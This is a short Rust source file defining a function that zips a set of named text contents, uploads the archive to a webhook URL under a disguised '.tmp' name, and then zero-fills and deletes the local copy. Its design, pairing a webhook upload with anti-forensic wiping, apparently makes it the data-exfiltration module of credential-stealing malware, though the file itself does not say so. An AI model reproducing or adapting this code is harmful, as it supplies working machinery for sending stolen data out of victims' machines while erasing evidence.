use std::{env, fs, io::Write, time::{SystemTime, UNIX_EPOCH}};
use zip::write::FileOptions;

fn temp_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    if files.is_empty() {
        return Ok(());
    }

    let tag = temp_tag();
    let zip_path = env::temp_dir().join(format!("{tag}.tmp"));
    crate::logf!("zip building: {} entries", files.len());

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;
    crate::logf!("zip size: {} bytes", zip_data.len());

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(format!("{tag}.tmp"))
        .mime_str("application/octet-stream")?;

    let form = reqwest::multipart::Form::new().part("file", part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let body = response.text().await.unwrap_or_default();
    crate::logf!("webhook zip send: HTTP {status}");
    if !status.is_success() {
        crate::logf!("webhook zip body: {body}");
        let _ = fs::remove_file(&zip_path);
        return Err(format!("webhook failed: {status} {body}").into());
    }

    if let Ok(meta) = fs::metadata(&zip_path) {
        let len = meta.len().min(16 * 1024 * 1024) as usize;
        if len > 0 {
            let _ = fs::write(&zip_path, vec![0u8; len]);
        }
    }
    let _ = fs::remove_file(&zip_path);

    Ok(())
}
